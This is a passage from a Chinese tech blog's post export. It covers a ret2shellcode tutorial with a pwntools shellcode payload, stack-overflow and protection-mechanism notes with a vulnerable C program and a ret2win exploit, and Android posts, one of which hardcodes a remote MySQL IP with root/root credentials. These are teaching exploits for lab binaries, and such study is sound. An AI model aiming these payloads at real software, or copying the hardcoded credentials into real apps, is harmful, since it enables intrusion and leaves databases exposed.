[esp+80h+s].text:08048590 mov [esp], eax ; s.text:08048593 call _gets 12345678910EAX: 0xffffcebc --&gt; 0xf7ffd000 --&gt; 0x26f34 EBX: 0x0 ECX: 0xf7fb3dc7 --&gt; 0xfb48900a EDX: 0xf7fb4890 --&gt; 0x0 ESI: 0xf7fb3000 --&gt; 0x1d4d6c EDI: 0x0 EBP: 0xffffcf28 --&gt; 0x0 ESP: 0xffffcea0 --&gt; 0xffffcebc --&gt; 0xf7ffd000 --&gt; 0x26f34 EIP: 0x8048593 (&lt;main+102&gt;: call 0x80483d0 &lt;gets@plt&gt;)EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow) 可以看到该esp地址为0xffffcebc到ebp0xffffcf28 的距离为108，再加上ebp的4，距离一共为112，写出payload 12345678from pwn import *sh=process(&#x27;./ret2shellcode&#x27;)shellcode = asm(shellcraft.sh())buf2_addr = 0x804a080sh.sendline(shellcode.ljust(112, &#x27;A&#x27;) + p32(buf2_addr))sh.interactive() ret2syscall","categories":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/categories/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"}]},{"title":"Pwn-程序保护机制","slug":"Pwn/Pwn-程序保护机制","date":"2020-10-18T08:19:02.000Z","updated":"2021-04-01T14:04:24.000Z","comments":true,"path":"2020/10/18/Pwn/Pwn-程序保护机制/","link":"","permalink":"http://example.com/2020/10/18/Pwn/Pwn-%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/","excerpt":"","text":"STACK Canary栈溢出保护1.当启用栈保护后，函数开始执行的时候会先往栈底插入 cookie 信息，当函数真正返回的时候会验证 cookie 信息是否合法 (栈帧销毁前测试该值是否被改变)，如果不合法就停止程序运行 (栈溢出发生)。攻击者在覆盖返回地址的时候往往也会将 cookie 信息给覆盖掉，导致栈保护检查失败而阻止 shellcode 的执行，避免漏洞利用成功。在 Linux 中我们将 cookie 信息称为 Canary。 Canary 不管是实现还是设计思想都比较简单高效，就是插入一个值在 stack overflow 发生的高危区域的尾部。当函数返回之时检测 Canary 的值是否经过了改变，以此来判断 stack/buffer overflow 是否发生。 2.在GCC编译器中使用以下参数设置Canary: 12345-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护-fstack-protector-all 启用保护，为所有函数插入保护-fstack-protector-strong-fstack-protector-explicit 只对有明确 stack_protect attribute 的函数开启保护-fno-stack-protector 禁用保护 3.开启Cannary保护的栈结构 当程序有开启Canary编译后，在函数序言部分会去取fs寄存器0x28处的值，存放在栈中%ebp-0x8的位置，这个操作向栈中插入Canary值 12mov rax, qword ptr fs:[0x28]mov qword ptr [rbp - 8], rax 在函数返回之前，会见该值取出，并与fs:0x28的值进行异或。如果异或的结果为0，说明Canary未被修改，函数会正常返回，这个操作即可监测是否发生一个栈溢出 1234mov rdx,QWORD PTR [rbp-0x8]xor rdx,QWORD PTR fs:0x28je 0x4005d7 &lt;main+65&gt;call 0x400460 &lt;__stack_chk_fail@plt&gt; 如果此时Canary已经非法修改，此时程序流程会走到__stack_chk_fail NX数据执行保护数据执行保护，即DEP（Data Execution Prevention），是指禁止程序在非可执行的内存区中执行指令。在80x86的体系中，操作系统的内存管理是通过页面表(page table)存储方式来实现的，其最后一位就是NX位，0表示允许执行代码，1表示禁止执行代码。一般来说，NX主要是防止在栈或者堆上运行shellcode代码。gcc默认开启不可执行栈功能，添加编译选项-z execstack即可开启栈可执行功能。 ASLR地址空间随机化/proc/sys/kernel/randomize_va_space里的值可以控制系统级的ASLR。使用root权限可以进行修改，有三个值可以设置，具体说明： -0：关闭ASLR。 -1：mmap base、stack、vdso page将随机化。这意味着”.so“文件将被加载到随机地址。链接时指定了-pie选项的可执行程序，其代码段加载地址将被随机化。配置内核时如果指定了CONFIG_COMPAT_BRK,则randomize_va_space默认为1，此时heap没有随机化。 -2：在1的举出上增加了heap随机化。配置内核时如果禁用CONFIG_COMPAT_BRK，则randomize_va_space默认为2。ASLR可以保证在每次程序加载的时候自身和所加载的库文件都会被映射到虚拟地址空间的不同地址处。 PIE：代码段随机化RELRO：重定位有两种情况，即partial relro和full relro，具体区别就是前者重定位信息（如got表）可写，后者不可写。","categories":[{"name":"NodeJs","slug":"NodeJs","permalink":"http://example.com/categories/NodeJs/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"}]},{"title":"Pwn-栈溢出","slug":"Pwn/Pwn-栈溢出","date":"2020-10-18T01:33:28.000Z","updated":"2021-04-01T14:07:44.000Z","comments":true,"path":"2020/10/18/Pwn/Pwn-栈溢出/","link":"","permalink":"http://example.com/2020/10/18/Pwn/Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/","excerpt":"","text":"实现栈溢出的两个条件: 程序有向栈写入数据的行为 程序并不限制写入数据的长度 ESP和EBP两个寄存器如果想用栈溢出来执行攻击指令, 就要在溢出数据内包含攻击指令的内容或地址, 并且要将程序控制权交给该指令。攻击指令可以是自定义的指令, 也可以利用系统内已有的函数及指令。 函数调用经常是嵌套的, 在同一时刻, 堆栈中会有多个函数的信息. 每个未完成运行的函数占用一个独立的连续区域, 称作**栈帧(Stack Frame)**。 当函数被调用时, 栈帧被压入堆栈; 当函数返回时, 栈帧从堆栈中弹出. 栈帧存放函数的参数、函数返回地址、调用者(caller)的一些寄存器状态、函数的局部变量等。 栈帧的边界由栈帧基地址指针EBP和栈帧堆栈指针ESP界定(指正存放在相应寄存器中)。 EBP指向栈帧底部(高地址), 在当前栈帧内位置固定; ESP指向栈帧顶部(低地址), 当程序执行时ESP会随着数据的入栈和出栈而移动(如: 压入局部变量)。因此函数中对数据的访问大部分是基于EBP(通过记录对EBP的偏移量)。 ESP(Stack Pointer)是堆栈指针寄存器，存放执行函数对应栈帧的栈顶地址(也是系统栈的顶部)，且始终指向栈顶； EBP(Base Pointer)是栈帧基址指针寄存器，存放执行函数对应栈帧的栈底地址，用于C运行库访问栈中的局部变量和参数。 函数调用时入栈顺序1.先压入的是实参以及返回地址，再将EBP寄存器中的值压入，最后压入被调函数中的变量 实参-&gt;主调函数返回地址-&gt;主调函数栈帧EBP-&gt;被调函数局部变量 2.主调函数将参数按照调用约定依次入栈(上图为从右到左依次入栈)，然后Return Address指令指针EIP入栈以保存主调函数的返回地址(下一条待执行指令的地址)，压入返回地址时通过call是实现。 3.进入被调函数时，被调函数将主调函数的帧基指针EBP入栈，并将主调函数的栈顶指针ESP值赋给被调函数的EBP(作为被调函数的栈底)，接着改变ESP值来为函数局部变量预留空间。此时被调函数帧基指针指向被调函数的栈底。 4.被调函数帧基指针指向被调函数的栈底。以该地址为基准，向上(栈底方向)可获取主调函数的返回地址、参数值，向下(栈顶方向)能获取被调函数的局部变量值，而该地址处又存放着上一层主调函数的帧基指针值。 5.调用结束后，将EBP指针值赋给ESP，使ESP再次指向被调函数栈底以释放局变量；再将已压栈的主调函数帧基指针弹出到EBP，并弹出返回地址到EIP。ESP继续上移越过参数，最终回到函数调用前的状态，即恢复原来主调函数的栈帧。如此递归便形成函数调用栈。 “leave;ret指令”该指令等价于“mov sp,bp; pop bp;ret”等指令执行完毕，站定指针被设置为bp所指向的值，改变bp的值，能起到到很多作用，如执行rop，扩展栈空间。 6.例子： 123456789101112131415struct Strt&#123; int member1; int member2; int member3; &#125;;int StackFrameContent(int para1, int para2, int para3)&#123; int locVar1 = 1; int locVar2 = 2; int locVar3 = 3; int arr[] = &#123;0x11,0x22,0x33&#125;; struct Strt tStrt = &#123;0&#125;; &#125; 内存地址从栈底到栈顶递减，压栈就是把ESP指针逐渐往地低址移动的过程。而结构体tStrt中的成员变量memberX地址=tStrt首地址+(memberX偏移量)，即越靠近tStrt首地址的成员变量其内存地址越小。因此，结构体成员变量的入栈顺序与其在结构体中声明的顺序相反。 函数参数值传递与指针传递区别：函数调用以值传递，传入实参与被函数内操作的形参两者的存储地址不同，因此被调函数无法直接修改主调函数实参值，为达到修改目的，需要向被调函数传递实参变量的指针（即变量的地址）。 函数调用约定函数参数的传递顺序和方式最常见的参数传递方式是通过堆栈传递。主调函数将参数压入栈中，被调函数以相对于帧基指针的正偏移量来访问栈中的参数。对于有多个参数的函数，调用约定需规定主调函数将参数压栈的顺序(从左至右还是从右至左)。某些调用约定允许使用寄存器传参以提高性能。 栈的维护方式主调函数将参数压栈后调用被调函数体，返回时需将被压栈的参数全部弹出，以便将栈恢复到调用前的状态。该清栈过程可由主调函数负责完成，也可由被调函数负责完成。 名字修饰策略又称函数名修饰(Decorated Name)规则。编译器在链接时为区分不同函数，对函数名作不同修饰。 若函数之间的调用约定不匹配，可能会产生堆栈异常或链接错误等问题。因此，为了保证程序能正确执行，所有的函数调用均应遵守一致的调用约定。 cdecl调用约定(函数参数从右往左的顺序入栈,函数调用者负责清除栈中的参数,返回值在EAX中)所有非C++成员函数和未使用stdcall或fastcall声明的函数都默认是cdecl方式，cdecl方式的名字修饰约定是在函数名前添加一个下划线；对于C++函数，除非特别使用extern “C”，C++函数使用不同的名字修饰方式。 调用方式 stdcall(Win32) cdecl fastcall thiscall(C++) naked call 参数压栈顺序 从右至左 从右至左 从右至左，Arg1在ecx，Arg2在edx 从右至左，this指针在ecx 自定义 参数位置 栈 栈 栈 + 寄存器 栈，寄存器ecx 自定义 负责清栈的函数 被调函数 主调函数 被调函数 被调函数 自定义 支持可变参数 否 是 否 否 自定义 函数名字格式 _name@number _name @name@number 自定义 参数表开始标识 “@@YG” “@@YA” “@@YI” 自定义 注：C++因支撑函数重载、命名空间和成员函数等语法特征，采用更为复杂的名字修饰策略。C++函数修饰名以”?”开始，后面紧跟函数名、参数表开始标识和按照类型代号拼出的返回值参数表。例如，函数int Function(char *var1,unsigned long)对应的stdcall修饰名为”?Function@@YGHPADK@Z”。 Windows API默认的函数调用协议 C/C++默认的函数调用协议 适用于对性能要求较高的场合 x86程序： 普通函数传参数：参数基本都压在栈上； syscall传参：eax对应系统调用号，ebx，ecx、edx、esi、edi、ebp分别对应前六个参数。多余的参数压在栈上。 x64程序： 普通函数传参数：先使用rdi、rsi、rdx、rcx、r8、r9寄存器作为函数参数的前六个参数，多余参数会一次压在栈上。 syscall传参：rax对应系统调用号，传参规则和普通函数传参一致。 arm程序： RO、R1、R2、R3，依次对应前四个参数，多余的参数会一次压在栈上。 —stacall和—fastcall这两种调用方式的传参规则如上表 基本的栈溢出操作1234567891011121314//first.c#include &lt;stdio.h&gt;#include &lt;string.h&gt;void success() &#123; puts(&quot;You Hava already controlled it.&quot;); &#125;void vulnerable() &#123; char s[12]; gets(s); puts(s); return;&#125;int main(int argc, char **argv) &#123; vulnerable(); return 0;&#125; 编译代码：不开启堆栈溢出保护，关闭 PIE（Position Independent Executable），避免加载基址被打乱 gcc -m32 -fno-stack-protector -no-pie first.c -o first 用checksec查看 没有开栈溢出保护以及随机地址 NX是栈不可执行保护已经打开 在IDA中看到 该char字符距离栈底EBP有0x14也就是20个字节，根据函数栈的一个基本模型可以画出这个结构 目的应该就是要覆盖调用函数的返回地址，这样的话要覆盖0X14+0X4个字节一共是24个字节，然后再加上一个返回地址 由IDA可以看到success的首地址为0X08048456 123456789101112##coding=utf8from pwn import *## 构造与程序交互的对象sh = process(&#x27;./first&#x27;)success_addr = 0x08048456## 构造payloadpayload = &#x27;a&#x27; * 24 + p32(success_addr)#print p32(success_addr)## 向程序发送字符串sh.sendline(payload)## 将代码交互转换为手工交互sh.interactive() 最后运行到了success函数 ROP","categories":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/categories/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"}]},{"title":"数据结构-二叉树","slug":"数据结构/数据结构-二叉树","date":"2020-10-17T03:54:26.000Z","updated":"2021-04-01T14:11:56.000Z","comments":true,"path":"2020/10/17/数据结构/数据结构-二叉树/","link":"","permalink":"http://example.com/2020/10/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E4%BA%8C%E5%8F%89%E6%A0%91/","excerpt":"","text":"1.树的定义1.树的节点：使用树结构存储的每一个数据元素被称为”节点“。 图中每一个圆圈代表一个节点 如果一个节点没有父节点，那么这个节点就是整棵树的根节点 2.节点的度和层次对于一个节点，拥有的子树数（节点有多少分支）称为节点的度。 结点的层次：从一棵树的树根开始，树根所在层为第一层，根的孩子结点所在的层为第二层，依次类推。对于图 1（A）来说，A 结点在第一层，B、C、D 为第二层，E、F、G、H、I、J 在第三层，K、L、M 在第四层。 一个树的深度或高度是树种节点所在的最大的层次，上图树的深度为4。 3.有序树和无序树：如果树中节点的子树从左到右看，左右顺序有规定，则称为有序树，反之为无序树 4.森林由m(m&gt;=0)个互不相交的树的集合称为森林，上图，分别以B、C、D为根节点的三棵子树就可以称为森林，前面讲到，树可以理解为是由根结点和若干子树构成的，而这若干子树本身是一个森林，所以，树还可以理解为是由根结点和森林组成的。用一个式子表示为：","categories":[{"name":"数据结构","slug":"数据结构","permalink":"http://example.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"数据结构","slug":"数据结构","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]},{"title":"Android-并发多线程操作","slug":"Android/Android-并发多线程操作","date":"2020-10-13T02:46:43.000Z","updated":"2021-04-01T13:44:02.000Z","comments":true,"path":"2020/10/13/Android/Android-并发多线程操作/","link":"","permalink":"http://example.com/2020/10/13/Android/Android-%E5%B9%B6%E5%8F%91%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%93%8D%E4%BD%9C/","excerpt":"","text":"CountDownLatch实现并发多线程操作1.Java中的concurrent包里面的CountDownLatch其实可以把它看作一个计数器，只不过这个计数器的操作是原子操作，同时只能有一个线程去操作这个计数器，也就是同时只能有一个线程去减这个计数器里面的值。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081public class MainActivity extends AppCompatActivity &#123; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); testCountDownLatch(); &#125; //在主线程创建一个子线程，在子线程中创建一个线程池，通过在线程中使用CountDownLatch.await(),等线程池中的子线程全部执行完毕，再回到该线程 //执行UI操作 private void testCountDownLatch() &#123; final Handler handler = new Handler() &#123; public void handleMessage(Message msg) &#123; if (msg.what == 1)&#123; TextView textView=findViewById(R.id.test); textView.setText(&quot;设置完成&quot;); &#125; &#125; &#125;; new Thread() &#123; public void run() &#123; CountDownLatch latch = new CountDownLatch(2);// 设置计数值, ExecutorService exec = Executors.newCachedThreadPool();// 创建线程池 exec.execute(new TestRunable1(latch)); exec.execute(new TestRunable2(latch)); try &#123; latch.await();// 等待所有线程完成操作 &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; handler.sendEmptyMessage(1); exec.shutdown(); &#125;; &#125;.start(); &#125; class TestRunable1 implements Runnable &#123; private CountDownLatch latch; public TestRunable1(CountDownLatch latch) &#123; super(); this.latch = latch; &#125; @Override public void run() &#123; try &#123; Thread.sleep(1000 * 5); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; latch.countDown(); &#125; &#125; class TestRunable2 implements Runnable &#123; private CountDownLatch latch; public TestRunable2(CountDownLatch latch) &#123; super(); this.latch = latch; &#125; @Override public void run() &#123; try &#123; Thread.sleep(1000 * 3); latch.countDown(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125;&#125; 123456ry &#123; latch.await();// 等待所有线程完成操作&#125; catch (InterruptedException e) &#123; e.printStackTrace();&#125; 放在主线程可以使全部countdown( )执行完才执行主线程","categories":[{"name":"Android","slug":"Android","permalink":"http://example.com/categories/Android/"}],"tags":[{"name":"Android","slug":"Android","permalink":"http://example.com/tags/Android/"}]},{"title":"Android-直连数据库","slug":"Android/Android-直连数据库","date":"2020-10-04T12:23:20.000Z","updated":"2021-04-01T13:52:22.000Z","comments":true,"path":"2020/10/04/Android/Android-直连数据库/","link":"","permalink":"http://example.com/2020/10/04/Android/Android-%E7%9B%B4%E8%BF%9E%E6%95%B0%E6%8D%AE%E5%BA%93/","excerpt":"","text":"导入包实现直连MySql数据库需要导入mysql-connector-java-5.1.30-binjar包（百度网盘提取码为：ctxa） 主窗口代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586package com.example.mysql;import androidx.appcompat.app.AppCompatActivity;import android.annotation.SuppressLint;import android.os.Bundle;import android.os.Handler;import android.os.Message;import android.view.View;import android.widget.Button;import android.widget.TextView;import java.util.HashMap;public class MainActivity extends AppCompatActivity &#123; private Button btn_get_data; private TextView tv_data; @SuppressLint(&quot;HandlerLeak&quot;) private Handler handler = new Handler()&#123; @Override public void handleMessage(Message msg) &#123; switch (msg.what)&#123; case 0x11: String s = (String) msg.obj; tv_data.setText(s); break; case 0x12: String ss = (String) msg.obj; tv_data.setText(ss); break; &#125; &#125; &#125;; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); btn_get_data=(Button) findViewById(R.id.button1); tv_data=(TextView) findViewById(R.id.text1); btn_get_data.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; // 创建一个线程来连接数据库并获取数据库中对应表的数据 new Thread(new Runnable() &#123; @Override public void run() &#123; // 调用数据库工具类DBUtils的getInfoByName方法获取数据库表中数据 HashMap&lt;String, Object&gt; map = DBUtils.getInfoByName(&quot;29282&quot;); Message message = handler.obtainMessage(); if(map != null)&#123; String s = &quot;&quot;; for (String key : map.keySet())&#123; s += key + &quot;:&quot; + map.get(key) + &quot;\\n&quot;; &#125; message.what = 0x12; message.obj = s; &#125;else &#123; message.what = 0x11; message.obj = &quot;查询结果为空&quot;; &#125; // 发消息通知主线程更新UI handler.sendMessage(message); &#125; &#125;).start(); &#125; &#125;); &#125;&#125; 主要是用HashMap去对应键值之间的关系 DBUtils类代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596package com.example.mysql;import android.content.Context;import android.util.Log;import android.widget.Toast;import java.sql.Connection;import java.sql.DriverManager;import java.sql.PreparedStatement;import java.sql.ResultSet;import java.sql.SQLException;import java.sql.Statement;import java.util.HashMap;import java.util.TooManyListenersException;/** * 数据库工具类：连接数据库用、获取数据库数据用 * 相关操作数据库的方法均可写在该类 */public class DBUtils &#123; private static String driver = &quot;com.mysql.jdbc.Driver&quot;;// MySql驱动// private static String url = &quot;jdbc:mysql://localhost:3306/map_designer_test_db&quot;; private static String user = &quot;root&quot;;// 用户名 private static String password = &quot;root&quot;;// 密码 private static Connection getConn(String dbName)&#123; Connection connection = null; try&#123; Class.forName(driver);// 动态加载类 String ip = &quot;47.96.151.142&quot;;// 写成本机地址，不能写成localhost，同时手机和电脑连接的网络必须是同一个 // 尝试建立到给定数据库URL的连接 connection = DriverManager.getConnection(&quot;jdbc:mysql://&quot; + ip + &quot;:3306/&quot; + dbName, user, password); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; return connection; &#125; public static HashMap&lt;String, Object&gt; getInfoByName(String name)&#123; HashMap&lt;String, Object&gt; map = new HashMap&lt;&gt;(); // 根据数据库名称，建立连接 Connection connection = getConn(&quot;mydb1&quot;); try &#123; // mysql简单的查询语句。这里是根据MD_CHARGER表的NAME字段来查询某条记录 String sql = &quot;select * from hearts where id = 4869&quot;;// String sql = &quot;select * from MD_CHARGER&quot;; if (connection != null)&#123;// connection不为null表示与数据库建立了连接 PreparedStatement ps = connection.prepareStatement(sql); if (ps != null)&#123; // 设置上面的sql语句中的？的值为name// ps.setString(1, name); // 执行sql查询语句并返回结果集 ResultSet rs = ps.executeQuery(); if (rs != null)&#123; int count = rs.getMetaData().getColumnCount(); Log.e(&quot;DBUtils&quot;,&quot;列总数：&quot; + count); while (rs.next())&#123; // 注意：下标是从1开始的 for (int i = 1;i &lt;= count;i++)&#123; String field = rs.getMetaData().getColumnName(i); //id名 值 map.put(field, rs.getString(field)); &#125; &#125; connection.close(); ps.close(); return map; &#125;else &#123; return null; &#125; &#125;else &#123; return null; &#125; &#125;else &#123; return null; &#125; &#125;catch (Exception e)&#123; e.printStackTrace(); Log.e(&quot;DBUtils&quot;,&quot;异常：&quot; + e.getMessage()); return null; &#125; &#125;&#125;","categories":[{"name":"Android","slug":"Android","permalink":"http://example.com/categories/Android/"}],"tags":[{"name":"Android","slug":"Android","permalink":"http://example.com/tags/Android/"}]},{"title":"Android-数据存储","slug":"Android/Android-数据存储","date":"2020-09-26T02:30:52.000Z","updated":"2021-04-01T13:53:32.000Z","comments":true,"path":"2020/09/26/Android/Android-数据存储/","link":"","permalink":"http://example.com/2020/09/26/Android/Android-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/","excerpt":"","text":"Android数据持久化Android主要提供了三种方式数据持久：文件存储、SharePreference或数据库来保存数据 文件存储Context类中提供了一个openFileOutput( )方法，可以将数据存到指定文件，该方法有两个参数 第一个参数是文件名，在文件创建的时候使用的就是这个名词，这里指定的文件名不包含路径，因为所有的文件都是默认存到/data/data/&lt;packagename&gt;/files目录下，第二个参数文件的操作模式，主要有两种模式可选MODE_PRIVATE和MODE_APPEND MODE_PRIVATE是默认操作模式，表示指定同样文件名，所写入的内容将会覆盖源文件的内容 MODE_APPEND则表示如果文件已经存在，就往里面追加内容，不存在就创建新文件 通过点击按钮去保存主窗口的editText的内容，然后主activity的内容： 1234567891011121314151617181920212223242526272829303132333435363738394041public class MainActivity extends AppCompatActivity &#123; EditText editText; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); editText=(EditText) findViewById(R.id.edit_text); Button button=(Button) findViewById(R.id.button1); button.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; String data=editText.getText().toString(); Save(data); Intent intent=new Intent(MainActivity.this,msgActivity.class); startActivity(intent); &#125; &#125;); &#125; public void Save(String data)&#123; FileOutputStream out=null; BufferedWriter writer =null; try &#123; //打开文件输出流 out=openFileOutput(&quot;data&quot;, Context.MODE_PRIVATE); //缓存写入流拿到文件输出流 writer=new BufferedWriter(new OutputStreamWriter(out)); writer.write(data); &#125;catch (IOException e)&#123; e.printStackTrace(); &#125;finally &#123; try &#123; if(writer!=null)&#123; writer.close(); &#125; &#125;catch (IOException e)&#123; e.printStackTrace(); &#125; &#125; &#125;&#125; 该窗口最重要的是Save内容，其中先开输出文件流，用缓存写入流去拿到这个文件输出流，然后将数据写入到输出流中 下面是消息活动，主要内容是读文件的内容，操作与写入类似，使用的是文件输入流，以及缓存读取 12345678910111213141516171819202122232425262728293031323334353637383940414243public class msgActivity extends AppCompatActivity &#123; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_msg); TextView textView=(TextView) findViewById(R.id.text_view); String data=tostringread(); textView.setText(data); Toast.makeText(msgActivity.this,data,Toast.LENGTH_SHORT).show(); &#125; public String tostringread()&#123; FileInputStream in=null; BufferedReader reader=null; StringBuilder last=new StringBuilder(); try &#123; //打开文件输入 获取文件输入流 in=openFileInput(&quot;data&quot;); //通过缓存读取去获得文件输入流 reader=new BufferedReader(new InputStreamReader(in)); //处理一个输入流 String line=&quot;&quot;; while ((line=reader.readLine())!=null)&#123; last.append(line); &#125; &#125;catch (IOException e)&#123; e.printStackTrace(); &#125;finally &#123; if(reader!=null)&#123; try &#123; reader.close(); &#125;catch (IOException e)&#123; e.printStackTrace(); &#125; &#125; &#125; return last.toString(); &#125;&#125; 先打开一个文件输入流，缓存读取去活动文件输入流，然后处理缓存的内容 此项的StringBuilder跟String类似，不过StringBuilder可以直接对内存空间进行一个持续的添加与修改，最后再转化为String，这样效率会相同较高 SharePreferences存储不同文件的存储方式，sharepreferences是使用 键值对 的方式来存储数据的，意思就是当保存一条数据的时候，需要给这条数据提供一个对应的键，这样读取数据的时候就可以通过这个键把相应的值取出来，而SharePrefences还支持多种不同的数据类型存储，如果存储的数据类型是整型，那么读出来的数据也是整形，如果存储的数据是一个字符串，那么读取出来的数据仍是字符串 a、Context类中的getSharePreferens( )方法该方法两个参数，第一个参数用于指定SharedPreferences文件的名称，如果指定的文件不存在则会创建一个，SharedPreferens文件都是存放在/data/data/&lt;package name&gt;/shared_prefs/目录下；第二个参数是用于指定一操作模式，只有MODE_PRIVATE一种模式可以选 b、Activity类中的getPreferences( )方法与上面很相似，不过这个方法只接收一个操作模式的参数，使用这个方法会自动将当前活动的类名作为SharedPreferences的文件名 c、PreferenceManger类中的getDefalutSharePreferences( )方法 主窗口 12345678910111213141516171819202122232425ublic class MainActivity extends AppCompatActivity &#123; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Button button=(Button) findViewById(R.id.button_write); button.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; SharedPreferences.Editor editor=getSharedPreferences(&quot;data&quot;,MODE_PRIVATE).edit(); editor.putString(&quot;name&quot;,&quot;caixukun&quot;); editor.putInt(&quot;age&quot;,56); editor.putBoolean(&quot;married&quot;,false); editor.apply(); Intent intent=new Intent(MainActivity.this,msgActivity.class); startActivity(intent); &#125; &#125;); &#125;&#125; 消息窗口读数据 1234567891011121314151617181920public class msgActivity extends AppCompatActivity &#123; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_msg); TextView text_name=(TextView) findViewById(R.id.text_name); TextView text_age=(TextView) findViewById(R.id.text_age); TextView text_married=(TextView) findViewById(R.id.text_married); SharedPreferences pref=getSharedPreferences(&quot;data&quot;,MODE_PRIVATE); String name=pref.getString(&quot;name&quot;,&quot;&quot;); String age=pref.getInt(&quot;age&quot;,0)+&quot;&quot;; String married=pref.getBoolean(&quot;married&quot;,true)+&quot;&quot;; Toast.makeText(msgActivity.this,name+age,Toast.LENGTH_SHORT).show(); text_name.setText(name); text_age.setText(age); text_married.setText(married); &#125;&#125; 实现一个密码记住功能 登录窗口源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public class login extends AppCompatActivity &#123; private SharedPreferences pref; private SharedPreferences.Editor editor; @Override protected void onCreate(final Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_login); Button button=(Button) findViewById(R.id.button_1); final CheckBox checkBox=(CheckBox) findViewById(R.id.checkbox2); final EditText username=(EditText) findViewById(R.id.edit_id); final EditText password=(EditText) findViewById(R.id.edit_password); //这里使用的是Manager的一个静态方法 pref= PreferenceManager.getDefaultSharedPreferences(this); boolean isRemmber=pref.getBoolean(&quot;remember_password&quot;,false); if(isRemmber)&#123; String name=pref.getString(&quot;username&quot;,&quot;&quot;); String pass=pref.getString(&quot;password&quot;,&quot;&quot;); password.setText(pass); username.setText(name); checkBox.setChecked(true); &#125; button.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; String name=username.getText().toString(); String pass=password.getText().toString(); if(name.equals(&quot;admin&quot;)&amp;&amp;pass.equals(&quot;123&quot;))&#123; //添加数据需要获取一个edit( )方法 editor=pref.edit(); if(checkBox.isChecked())&#123; editor.putBoolean(&quot;remember_password&quot;,true); editor.putString(&quot;username&quot;,&quot;admin&quot;); editor.putString(&quot;password&quot;,&quot;123&quot;); &#125;else&#123; editor.clear(); &#125; editor.apply(); Intent intent=new Intent(login.this,MainActivity.class); startActivity(intent); &#125;else&#123; Toast.makeText(login.this,&quot;密码账户错误&quot;,Toast.LENGTH_SHORT).show(); &#125; &#125; &#125;); &#125;&#125; 如果使用的是 1editor.clear(); 会清除所有该数据表的内容，所以不能随便乱用 使用SQLite语言了解SQLiteOpenHelper帮助类，以及两个实例方法，实例方法返回的是一个SQLiteDatabse对象，一般用帮助类进行一个建表以及更新表的操作，用SQLiteDatabase对象进行一个增删改查的操作 创建数据库 Android为了更加方便管理数据库，专门提供了一个SQLiteOpenHelper帮助类，借助这类可以非常简单对数据库进行创建和升级。 SQLiteOpenHelper是一个抽象类，使用的话肯定需要帮助类进行一个继承，SQLiteOpenHelper中有两个抽象方法，分别是onCreate( )和onUpgrade( )，这两个方法必须进行一个重写，然后在这两个方法中去实现创建以及升级数据库的逻辑。 该实例方法中还有两个非常重要的实例方法getReadableDatabase( )和getWritableDatabase( ) 这两个方法都可以创建或打开一个现有的数据库(如果数据已存在则直接打开，否则创建一个新的数据库)，并返回一个可对数据库进行读写操作的对象。不同的是，当数据库不可写入的时候： getReadableDatabase( )方法返回的对象将以读的方式打开数据库， getWriteableDatabase( )方法将出现异常。 SQLiteOpenHelper中有两个构造方法可重写，一般使用参数少一点的构造方法，该构造方法接收4个参数，第一个参数是Context，第二个参数是数据库名，创建数据库时使用的就是这里指定的名称，第三个参数允许我们在查询数据的时候返回一个自定义的Cursor，一般传入null，第四个参数表示当前的数据库版本号，可用于对数据库进行升级操作。 构建出SQLiteOpenHelper的实例之后，再调用它的getReadableDatabase( )和getWriteableDatabase( )方法就能创建数据库。 创建后的数据库文件会放在/data/data/&lt;package name&gt;/databases目录下 SQLite的数据类型很简单，integer表示整型，real表示浮点型，text表示文本型，blob表示二进制型，primary key将id列为主键，并用autoincrement表示id列是自增长的 创建数据库 1234567891011121314151617181920212223242526272829303132333435363738394041424344public class MainActivity extends AppCompatActivity &#123; public class MydatabaseHelper extends SQLiteOpenHelper&#123; public static final String CREATE_BOOK=&quot;create table Book (&quot; + &quot;id integer primary key 